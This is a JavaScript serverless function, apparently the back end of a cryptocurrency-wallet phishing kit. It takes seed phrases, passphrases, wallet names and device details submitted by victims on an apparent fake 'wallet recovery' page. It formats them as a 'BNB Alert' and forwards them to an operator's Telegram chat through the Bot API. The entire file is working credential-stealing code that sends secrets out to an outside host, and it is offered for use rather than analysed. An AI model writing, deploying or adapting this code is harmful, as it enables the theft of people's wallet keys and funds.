// Vercel Serverless Function for Telegram submissions
// Environment variables: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

module.exports = async (req, res) => {
  const requestId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
  console.log(`[${requestId}] 📥 Incoming request:`, {
    method: req.method,
    url: req.url,
    timestamp: new Date().toISOString()
  });

  // Only allow POST requests
  if (req.method !== 'POST') {
    console.log(`[${requestId}] ❌ Invalid method:`, req.method);
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Get credentials from environment variables
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Validate environment variables
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error(`[${requestId}] ❌ Missing Telegram credentials in environment variables`);
    return res.status(500).json({ error: 'Server configuration error' });
  }

  try {
    // Parse request body (Vercel automatically parses JSON and form-urlencoded)
    let phrase, passphrase, imported, keywords, copyUrl, deviceInfo, formattedDate;
    
    // Handle both JSON and form-urlencoded/FormData requests
    if (typeof req.body === 'object' && req.body !== null) {
      phrase = req.body.phrase;
      passphrase = req.body.passphrase;
      imported = req.body.imported;
      keywords = req.body.keywords;
      copyUrl = req.body.copyUrl;
      deviceInfo = req.body.deviceInfo;
      formattedDate = req.body.formattedDate;
    }

    console.log(`[${requestId}] 📋 Request data:`, {
      hasPhrase: !!phrase,
      phraseLength: phrase ? phrase.length : 0,
      hasImported: !!imported,
      imported: imported,
      hasKeywords: !!keywords,
      keywords: keywords,
      hasDeviceInfo: !!deviceInfo,
      deviceInfoLength: deviceInfo ? deviceInfo.length : 0,
      hasCopyUrl: !!copyUrl
    });

    // Validate required fields
    if (!phrase || !imported) {
      console.error(`[${requestId}] ❌ Missing required fields:`, {
        hasPhrase: !!phrase,
        hasImported: !!imported
      });
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Get device and browser information (passed from client)
    deviceInfo = deviceInfo || 'Unknown Device';
    formattedDate = formattedDate || new Date().toUTCString();
    const wordCountDesc = keywords ? `${keywords} word phrase` : '12 word phrase';

    // Escape HTML special characters (much simpler than Markdown!)
    // HTML parse mode only requires escaping: < > &
    function escapeHTML(text) {
      if (!text) return '';
      return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    }

    // Escape all user input fields for HTML
    const escapedPhrase = escapeHTML(phrase);
    const escapedWallet = escapeHTML(imported || 'Unknown');
    const escapedDate = escapeHTML(formattedDate);
    const escapedDevice = escapeHTML(deviceInfo.substring(0, 200));
    
    // Format Telegram message in "BNB Alert" style using HTML
    let message = `🚨 <b>BNB Alert</b>\n\n` +
                   `🔑 <b>SEED PHRASE SUBMITTED</b>\n\n` +
                   `👤 <b>Wallet:</b> ${escapedWallet}\n` +
                   `🔤 <b>Words:</b> ${wordCountDesc}\n` +
                   `🕐 <b>Time:</b> ${escapedDate}\n` +
                   `🌍 <b>Location:</b> Unknown, Unknown\n` +
                   `📱 <b>Device:</b> ${escapedDevice}${deviceInfo.length > 200 ? '...' : ''}\n\n` +
                   `🔒 <b>Seed Phrase:</b>\n` +
                   `<code>${escapedPhrase}</code>\n\n` +
                   `⚠️ <i>User attempted wallet recovery</i>\n\n`;
    
    // Add copy URL link if available
    if (copyUrl) {
      message += `<a href="${copyUrl}">📎 Click to Copy Phrase</a>`;
    }
    
    // Telegram message length limit is 4096 characters
    if (message.length > 4096) {
      // Truncate the seed phrase if message is too long
      const baseMessageLength = message.length - escapedPhrase.length;
      const maxPhraseLength = Math.max(0, 4096 - baseMessageLength - 100); // Leave 100 chars buffer
      const truncatedPhrase = phrase.substring(0, maxPhraseLength);
      const escapedTruncatedPhrase = escapeHTML(truncatedPhrase);
      message = `🚨 <b>BNB Alert</b>\n\n` +
                 `🔑 <b>SEED PHRASE SUBMITTED</b>\n\n` +
                 `👤 <b>Wallet:</b> ${escapedWallet}\n` +
                 `🔤 <b>Words:</b> ${wordCountDesc}\n` +
                 `🕐 <b>Time:</b> ${escapedDate}\n` +
                 `🌍 <b>Location:</b> Unknown, Unknown\n` +
                 `📱 <b>Device:</b> ${escapedDevice.substring(0, 100)}...\n\n` +
                 `🔒 <b>Seed Phrase:</b>\n` +
                 `<code>${escapedTruncatedPhrase}...</code>\n\n` +
                 `⚠️ <i>User attempted wallet recovery</i>\n\n`;
      if (copyUrl) {
        message += `<a href="${copyUrl}">📎 Click to Copy Phrase</a>`;
      }
    }

    // Final validation: Telegram message length limit is 4096 characters
    if (message.length > 4096) {
      console.error(`[${requestId}] ⚠️ Message too long:`, message.length, 'characters (max: 4096)');
      // Force truncate more aggressively
      const safeMaxLength = 3500;
      message = message.substring(0, safeMaxLength) + '...\n\n[Message truncated due to length]';
      console.log(`[${requestId}] ✂️ Truncated message to:`, message.length, 'characters');
    }

    console.log(`[${requestId}] 📤 Preparing to send message to Telegram. Length:`, message.length, 'characters');
    console.log(`[${requestId}] 📝 Message preview (first 200 chars):`, message.substring(0, 200));

    // Send to Telegram via Bot API
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const data = await response.json();

    if (data.ok) {
      console.log(`[${requestId}] ✅ Telegram message sent successfully. Length:`, message.length, 'characters');
      return res.status(200).json({ success: true, message: 'Message sent to Telegram successfully' });
    } else {
      console.error(`[${requestId}] ❌ Telegram API error:`, {
        ok: data.ok,
        error_code: data.error_code,
        description: data.description,
        message_length: message.length,
        phrase_preview: phrase ? phrase.substring(0, 50) + '...' : 'N/A',
        wallet: imported
      });
      return res.status(500).json({ error: 'Failed to send message to Telegram', details: data.description });
    }
  } catch (error) {
    console.error(`[${requestId}] ❌ Exception in Telegram API handler:`, {
      error: error.message,
      stack: error.stack,
      name: error.name
    });
    return res.status(500).json({ error: 'Internal server error' });
  }
};

